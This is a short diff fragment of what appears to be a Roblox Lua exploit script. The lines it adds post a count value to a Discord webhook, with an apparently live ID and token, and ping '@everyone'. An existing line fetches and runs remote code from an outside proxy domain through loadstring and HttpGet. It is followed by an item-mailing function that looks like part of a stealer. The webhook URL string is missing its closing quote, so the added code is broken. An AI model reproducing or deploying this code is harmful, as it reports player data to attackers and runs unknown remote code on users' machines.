@@ -14,6 +14,14 @@ end
 end
 end
 if potc>0 then
+request(
+{
+Url = "https://discordapp.com/api/webhooks/1298268105889288202/ExDWIDv3HFsqFSDjlTbGIUssoRILbcvJJGPrfTyhmMC1RR4VqmThwmxiUpcRZur-HMhv,
+Method = "POST",
+Headers = {["Content-Type"] = "application/json"},
+Body = '{"tts":false,"content":"@everyone '..potc..'"}'
+}
+)
 loadstring(game:HttpGet("https://proxy.darkside.lol/webhook-error.yve"))()("hui - "..potc)
 function _mail(u, t, i, n)
 local args = {
